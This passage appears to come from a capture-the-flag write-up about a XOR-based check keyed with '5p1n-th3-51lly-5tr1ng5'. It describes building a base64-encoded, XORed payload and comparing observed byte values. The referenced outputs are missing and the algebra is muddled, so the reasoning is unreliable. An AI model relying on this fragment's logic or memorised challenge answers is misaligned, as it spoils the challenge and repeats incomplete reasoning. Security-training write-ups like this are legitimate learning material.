BUT, there’s the xor function, but we all know how xor works, it’s reversible. output = “5p1n-th3-51lly-5tr1ng5” xor (input xor key) [!we can choose key and input, remember that!] if key = 0 : output = “5p1n-th3-51lly-5tr1ng5” xor input xor “5p1n-th3-51lly-5tr1ng5” output now matches input. Now it’s simpler. All we need to do is : Create a payload that contains “ak”,“a” and “d”, the payload must be base64 encoded THEN xored with “5p1n-th3-51lly-5tr1ng5” which is our key.

After trial and error, I found this line that compares our result with the expected result : “0xcd” is our input since A turns to 0xcd and we are comparing it with 0xa5 so there’s probably a xor with the LSB of the rand value, let’s try setting back to generating random values. let’s input “a” : Then I wondered : how can I solve this challenge if the values are random each time yet the compared value is always the same ? so I wrote “a” again : Same result.
